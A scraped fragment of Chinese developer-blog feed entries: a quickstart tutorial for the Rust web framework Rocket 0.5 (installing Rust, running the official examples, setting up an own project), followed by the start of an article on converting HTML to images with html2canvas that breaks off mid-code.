<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, world!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>可以直接复制到你自己项目的 <code>src/main.rs</code>，然后改一改返回内容、路由路径等等：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, my own Rocket app!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>然后在你自己的项目目录下运行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>如果可以正常启动并访问，就说明你已经基于示例工程，搭好了属于自己的 Rocket 0.5 项目骨架。</p>
<h2 data-id="heading-11">五、Quickstart 背后的思路：先“跑起来”，再“搞明白”</h2>
<p>Quickstart 推荐的路线非常符合一个简单原则：</p>
<blockquote>
<p><strong>先跑起来，再搞明白。</strong></p>
</blockquote>
<p>具体来说，它帮你解决了三个常见阻碍：</p>
<ol>
<li><strong>环境恐惧症</strong>：不知道 Rust 怎么装？→ rustup 一条命令搞定</li>
<li><strong>框架上手恐惧症</strong>：不知道 Rocket 入口在哪？→ 直接跑 examples</li>
<li><strong>工程搭建恐惧症</strong>：不知道 Cargo.toml 怎么写？→ 先看示例，再复制到自己项目里改</li>
</ol>
<p>对刚上手 Rocket 的同学，比较推荐这样一条学习路径：</p>
<ol>
<li>跑 <code>examples/hello</code> → 确认环境无问题</li>
<li>跑 <code>examples/json</code> / <code>examples/forms</code> → 熟悉基本功能</li>
<li>新建自己的项目，把示例代码迁移过去 → 形成自己的起步工程</li>
<li>之后再去看文档中更完整的章节：路由、请求守卫、响应器、配置、数据库、模板等</li>
</ol>
<h2 data-id="heading-12">六、结语</h2>
<p>Rocket 的 Quickstart 给出的其实不是“理论教学”，而是一条<strong>非常务实的实践路径</strong>：</p>
<ul>
<li>用最少的步骤，快速体验到框架的真实开发感受；</li>
<li>再借助 examples 作为“可运行的文档”，一点点把思想搞明白。</li>
</ul>
<p>如果你已经完成了：</p>
<ul>
<li>Rust 环境安装</li>
<li>Rocket 仓库克隆</li>
<li><code>examples/hello</code> 能正常跑</li>
<li>基于示例创建了自己的 <code>my-rocket-app</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务]]></title>    <link>https://juejin.cn/post/7581888578507980827</link>    <guid>https://juejin.cn/post/7581888578507980827</guid>    <pubDate>2025-12-10T02:41:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507980827" data-draft-id="7581727073581989939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T02:41:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:41:17.000Z" title="Wed Dec 10 2025 02:41:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前置条件：先把 Rust 环境装好</h2>
<p>Rocket 是一个 Rust Web 框架，所以第一步当然是：<strong>安装 Rust 工具链</strong>。</p>
<p>官方推荐使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Frustup.rs%2F" target="_blank" title="https://rustup.rs/" ref="nofollow noopener noreferrer"><code>rustup</code></a> 管理 Rust 版本，它的优势是：</p>
<ul>
<li>支持 stable / beta / nightly 多通道切换</li>
<li>可以按项目目录覆盖版本（对 Rocket 很实用）</li>
<li>升级、卸载都很简单</li>
</ul>
<p>如果你还没装 Rust，可以简单理解流程：</p>
<ol>
<li>
<p>打开 rustup 官网，按提示执行安装命令；</p>
</li>
<li>
<p>安装完成后，在终端里执行：</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>如果两个命令都能正常输出版本号，说明环境 OK。</p>
</li>
</ol>
<blockquote>
<p>如果你完全没接触过 Rust，建议先稍微看几眼《The Rust Programming Language》（俗称 Rust Book），再用 Rocket 会更顺畅。</p>
</blockquote>
<h2 data-id="heading-1">二、最快体验 Rocket：直接跑官方例子</h2>
<p>Rocket 提供了一套非常完善的 <strong>examples 示例工程</strong>，几乎覆盖了常见场景：
比如 Hello World、JSON API、文件服务、表单、WebSocket 等。</p>
<p>最简单的上手方式是：<strong>把整个 Rocket 仓库拉下来，然后进 examples 跑 demo</strong>。</p>
<h3 data-id="heading-2">2.1 克隆 Rocket 仓库</h3>
<p>在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>接着切到 0.5 版本的 tag（保证文档与代码一致）：</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<blockquote>
<p>为什么建议切到 v0.5 ？
因为你现在看的文档、升级指南都是基于 0.5 的，如果直接在 <code>master</code> 上，可能会遇到还没稳定的新改动，和文档不匹配。</p>
</blockquote>
<h3 data-id="heading-3">2.2 运行 hello 示例</h3>
<p>Rocket 的示例都放在 <code>examples/</code> 目录下，先从最经典的 <code>hello</code> 开始：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>如果一切顺利，你会看到类似输出（省略部分）：</p>
<pre><code class="hljs language-text" lang="text">🚀 Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>这时候浏览器打开 <code>http://127.0.0.1:8000</code>，就能看到第一个 Rocket Web 服务的响应了。</p>
<blockquote>
<p><strong>小技巧：</strong>
所有 examples 目录下的示例，都可以通过 <code>cargo run</code> 启动：</p>
<ul>
<li><code>examples/json</code></li>
<li><code>examples/forms</code></li>
<li><code>examples/chat</code>（实时聊天）</li>
<li><code>examples/websocket</code>（如果有的话，取决于你当前 tag）
可以按需一个个玩过去，感受一下 Rocket 0.5 的能力边界。</li>
</ul>
</blockquote>
<h3 data-id="heading-4">2.3 为什么官方推荐“先跑 examples”</h3>
<p>原因很简单：<strong>门槛最低、反馈最快</strong>：</p>
<ul>
<li>不用自己写 <code>Cargo.toml</code>、不需要纠结依赖版本；</li>
<li>不需要一开始就理解 Rocket 的所有概念；</li>
<li>先跑起来，再逐步从 “能跑” → “能改” → “能写自己的”。</li>
</ul>
<p>而且 examples 里的 <code>Cargo.toml</code> 已经帮你配置好了：</p>
<ul>
<li>依赖指向本地 <code>rocket</code> 源码（path dependency）；</li>
<li>已经包含了对应示例需要的 feature（比如 json、templates 等）。</li>
</ul>
<p>接下来要做的，就是<strong>把这些示例变成你自己的项目</strong>。</p>
<h2 data-id="heading-5">三、从官方示例“复制”出自己的 Rocket 项目</h2>
<p>当你对某个示例比较满意时，通常有两种做法：</p>
<ol>
<li>在 Rocket 仓库里直接改（不推荐，难以与官方更新解耦）</li>
<li>把示例代码 copy 到你自己的项目目录，然后调整 <code>Cargo.toml</code>（推荐）</li>
</ol>
<h3 data-id="heading-6">3.1 新建一个自己的项目目录</h3>
<p>比如你想写一个自己的 Rocket 服务叫 <code>my-rocket-app</code>：</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>这会生成一个标准的 Rust 二进制项目结构：</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
├── Cargo.toml
└── src
    └── main.rs
</code></pre>
<h3 data-id="heading-7">3.2 修改 Cargo.toml：依赖 Rocket 0.5</h3>
<p>将 <code>Cargo.toml</code> 改成类似这样（根据需求添加 features）：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># 如果你需要模板：</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
<span class="hljs-comment"># 如果你需要数据库池：</span>
<span class="hljs-comment"># rocket_sync_db_pools = "0.1.0"</span>
</code></pre>
<p>注意两点：</p>
<ol>
<li>这里的 <code>rocket</code> 不再是指向本地源码，而是正常从 crates.io 拉取；</li>
<li>你需要手动补上之前示例中依赖的功能（比如 <code>json</code> / <code>secrets</code> / 模板等）。</li>
</ol>
<h3 data-id="heading-8">3.3 复制示例代码到自己的 main.rs</h3>
<p>比如你喜欢 <code>examples/hello/src/main.rs</code> 中的写法，就可以直接 copy 内容到自己的 <code>src/main.rs</code>，然后稍作修改，变成你自己的版本。</p>
<p>一个最迷你的 Rocket 0.5 <code>main.rs</code> 大致像这样：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, Rocket 0.5!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>然后在你自己的项目目录下执行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>如果能正常启动、返回了你期望的内容，说明你已经<strong>从“跑官方 demo”成功迈进到“有自己项目”这一步</strong>。</p>
<h2 data-id="heading-9">四、常见疑问：示例的 Cargo.toml 和我自己的有什么区别？</h2>
<p>看 examples 目录时你可能会发现：
示例里的 <code>Cargo.toml</code> 不是直接写 <code>rocket = "0.5.1"</code>，而是用本地路径依赖，比如：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>这是因为：</p>
<ul>
<li>examples 需要在 <strong>Rocket 仓库内部</strong>直接编译、调试；</li>
<li>官方开发者会在本地反复修改 Rocket 源码并及时验证示例是否还能跑通；</li>
<li>为了保证一致性，示例直接依赖仓库内的源码，而不是 crates.io 上的版本。</li>
</ul>
<p>而你建自己的项目时，<strong>不应该继续用 path 依赖</strong>，而是像正常 Rust 项目一样指定版本号，这样：</p>
<ul>
<li>构建、部署过程更标准；</li>
<li>不用带着整个 Rocket 仓库一起走；</li>
<li>升级 Rocket 时只需要改 <code>Cargo.toml</code> 即可。</li>
</ul>
<h2 data-id="heading-10">五、总结：Quickstart 的“推荐路线图”</h2>
<p>可以把 Rocket 0.5 的快速上手路线总结成 4 步：</p>
<ol>
<li>
<p><strong>装 Rust 工具链（rustup）</strong></p>
</li>
<li>
<p><strong>克隆 Rocket 仓库并切到 v0.5</strong></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
git checkout v0.5
</code></pre>
</li>
<li>
<p><strong>进 examples 跑 demo</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
</li>
<li>
<p><strong>新建自己的项目，用示例代码做模板</strong></p>
<ul>
<li><code>cargo new my-rocket-app --bin</code></li>
<li>调整 <code>Cargo.toml</code> 依赖 <code>rocket = { version = "0.5.1", features = [...] }</code></li>
<li>把示例里你喜欢的 main / routes 复制过来改一改</li>
</ul>
</li>
</ol>
<p>做到这里，你已经完成了 Rocket 的“冷启动”：
从零 → 跑 demo → 拥有自己的项目。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[将html转化成图片]]></title>    <link>https://juejin.cn/post/7581786379803377699</link>    <guid>https://juejin.cn/post/7581786379803377699</guid>    <pubDate>2025-12-10T02:33:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581786379803377699" data-draft-id="7581750253000540195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="将html转化成图片"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T02:33:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小明记账簿_微信小程序"/> <meta itemprop="url" content="https://juejin.cn/user/1901536389893546"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            将html转化成图片
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1901536389893546/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小明记账簿_微信小程序
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:33:14.000Z" title="Wed Dec 10 2025 02:33:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>如何将指定html内容转化成图片保存？这个问题很值得深思，实际应用中也很有价值。最直接的想法就是使用<code>canvas</code>，熟悉<code>canvas</code>的同学可以尝试一下。这里不做太多的说明，本文采用<code>html2canvas</code>库来实现。</p>
</blockquote>
<p><code>html2canvas</code>库的使用非常简单，只需要引入<code>html2canvas</code>库，然后调用<code>html2canvas</code>方法即可，<a href="https://link.juejin.cn?target=http%3A%2F%2Fhtml2canvas.hertzen.com%2F" target="_blank" title="http://html2canvas.hertzen.com/" ref="nofollow noopener noreferrer">官方地址</a>。</p>
<p>接下来说一下简单的使用，以<code>react</code>项目为例。</p>
<p>获取整个页面截图，可以使用底层ID<code>root</code>，这样下载的就是<code>root</code>下的所有元素。</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d282e459eb14541870200efc3001db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5piO6K6w6LSm57C_X-W-ruS_oeWwj-eoi-W6jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938794&amp;x-signature=Zdrj6WPwaUNGC5R0tZi5F%2FfG1K8%3D" width="50%" loading="lazy"/>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> html2canvas <span class="hljs-keyword">from</span> <span class="hljs-string">"html2canvas"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">saveCanvas</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 画布基础元素，要绘制的元素</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">canvas</span>: any = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"root"</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: any = { <span class="hljs-attr">scale</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">useCORS</span>: <span class="hljs-literal">true</span> };
    <span class="hljs-title function_">html2canvas</span>(canvas, options).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">canvas</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> type = <span class="hljs-string">"png"</span>;
      <span class="hljs-comment">// 返回值是一个数据url，是base64组成的图片的源数据</span>
      <span class="hljs-keyword">let</span> imgDt = canvas.<span class="hljs-title function_">toDataURL</span>(type);
